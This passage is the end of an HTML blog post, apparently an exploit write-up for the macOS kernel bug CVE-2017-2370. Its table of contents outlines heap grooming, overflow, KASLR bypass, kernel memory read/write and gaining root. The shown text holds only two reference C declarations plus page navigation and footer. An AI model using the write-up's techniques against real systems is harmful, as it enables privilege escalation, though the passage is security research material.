<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">kern_return_t</span> <span class="title">clock_sleep_trap</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">mach_port_name_t</span> clock_name,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">sleep_type_t</span> sleep_type,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> sleep_sec,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> sleep_nsec,</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">mach_timespec_t</span> *wakeup_time)</span></span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>	<span class="title">proc</span> &#123;</span></span><br><span class="line">	LIST_ENTRY(proc) p_list;		<span class="comment">/* List of all processes. */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">pid_t</span>		p_pid;			<span class="comment">/* Process identifier. (static)*/</span></span><br><span class="line">	<span class="keyword">void</span> * 		task;			<span class="comment">/* corresponding task (static)*/</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
      <!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Home</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M12.5 6.56062L8.00001 2.06062L3.50001 6.56062V13.5L6.00001 13.5V11C6.00001 9.89539 6.89544 8.99996 8.00001 8.99996C9.10458 8.99996 10 9.89539 10 11V13.5L12.5 13.5V6.56062ZM13.78 5.71933L8.70711 0.646409C8.31659 0.255886 7.68342 0.255883 7.2929 0.646409L2.21987 5.71944C2.21974 5.71957 2.21961 5.7197 2.21949 5.71982L0.469676 7.46963L-0.0606537 7.99996L1.00001 9.06062L1.53034 8.53029L2.00001 8.06062V14.25V15H2.75001L6.00001 15H7.50001H8.50001H10L13.25 15H14V14.25V8.06062L14.4697 8.53029L15 9.06062L16.0607 7.99996L15.5303 7.46963L13.7806 5.71993C13.7804 5.71973 13.7802 5.71953 13.78 5.71933ZM8.50001 11V13.5H7.50001V11C7.50001 10.7238 7.72386 10.5 8.00001 10.5C8.27615 10.5 8.50001 10.7238 8.50001 11Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../index.html">Home</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Writing</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path clip-rule="evenodd" d="M4.25 0C3.00736 0 2 1.00736 2 2.25V11V11.25V11.5C2 12.5252 2.61705 13.4062 3.5 13.792V11.5V11.25V11C3.5 10.4477 3.94772 10 4.5 10H12.5V11.2305V12.5H10.5V14H12.5H14V12.5V11.2305V10V8.5V0.75V0H13.25H4.25ZM12.5 8.5V1.5H4.25C3.83579 1.5 3.5 1.83579 3.5 2.25V8.70802C3.80623 8.57422 4.14445 8.5 4.5 8.5H12.5ZM5.5 11.5C5.22386 11.5 5 11.7239 5 12V16L7 14.75L9 16V12C9 11.7239 8.77614 11.5 8.5 11.5H5.5Z" fill="currentColor" fill-rule="evenodd"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../archives/">Writing</a>
        </span>
      </li><!--
     --><li>
        <span style="display: flex; align-items: center;">
          <svg class="index-item-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" style="margin-right: 10px; color: white; width: 21px; ">
            <title>Projects</title>
            <path d="<svg data-testid="geist-icon" height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.80808 4.44191L2.25003 4.88386L3.13391 3.99997L2.69196 3.55803L1.63391 2.49997L2.69197 1.44191L3.13391 0.999972L2.25003 0.116089L1.80808 0.558031L0.484858 1.88126C0.143149 2.22296 0.143149 2.77698 0.484859 3.11869L1.80808 4.44191ZM12 0.999972H11.25V2.49997H12H13.5V11.75C13.5 12.7165 12.7165 13.5 11.75 13.5H4.25002C3.28353 13.5 2.50003 12.7165 2.50003 11.75V6.99997V6.24997H1.00003V6.99997V11.75C1.00003 13.5449 2.4551 15 4.25002 15H11.75C13.545 15 15 13.5449 15 11.75V1.74997V0.999972H14.25H12ZM7.75003 4.88386L8.19197 4.44191L9.51519 3.11869C9.8569 2.77698 9.8569 2.22296 9.51519 1.88126L8.19196 0.55803L7.75002 0.116089L6.86614 0.999973L7.30808 1.44191L8.36614 2.49997L7.30809 3.55803L6.86615 3.99997L7.75003 4.88386ZM4.13155 3.89688L4.02847 4.51535L5.26541 4.7215L5.36848 4.10303L5.86848 1.10303L5.97156 0.484566L4.73462 0.278409L4.63155 0.896878L4.13155 3.89688Z" fill="currentColor"></path></svg>" fill="white"/>
          </svg>
          <a href="../../../../https:/github.com/KpwnZ">Projects</a>
        </span>
      </li>
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">CVE-2017-2370</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bug"><span class="toc-number">1.1.</span> <span class="toc-text">Bug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Heap-Fengshui"><span class="toc-number">1.2.1.</span> <span class="toc-text">Heap Fengshui</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overflow"><span class="toc-number">1.2.2.</span> <span class="toc-text">Overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation"><span class="toc-number">1.2.3.</span> <span class="toc-text">Privilege escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KASLR"><span class="toc-number">1.2.4.</span> <span class="toc-text">KASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Read-arbitrary-kernel-memory"><span class="toc-number">1.2.5.</span> <span class="toc-text">Read arbitrary kernel memory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-kernel-memory-writing"><span class="toc-number">1.2.6.</span> <span class="toc-text">Arbitrary kernel memory writing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Time-to-get-root"><span class="toc-number">1.2.7.</span> <span class="toc-text">Time to get root!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Some-sturcture-we-use%E2%80%A6"><span class="toc-number">1.2.8.</span> <span class="toc-text">Some sturcture we use…</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&text=CVE-2017-2370"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&is_video=false&description=CVE-2017-2370"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2017-2370&body=Check out this article: https://kpwnz.github.io/2021/11/03/CVE-2017-2370/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&title=CVE-2017-2370"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&name=CVE-2017-2370&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kpwnz.github.io/2021/11/03/CVE-2017-2370/&t=CVE-2017-2370"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Xia0o0o0o
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="../../../../index.html">Home</a></li><!--
     --><!--
       --><li><a href="../../../../archives/">Writing</a></li><!--
     --><!--
       --><li><a href="../../../../https:/github.com/KpwnZ">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="../../../../js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
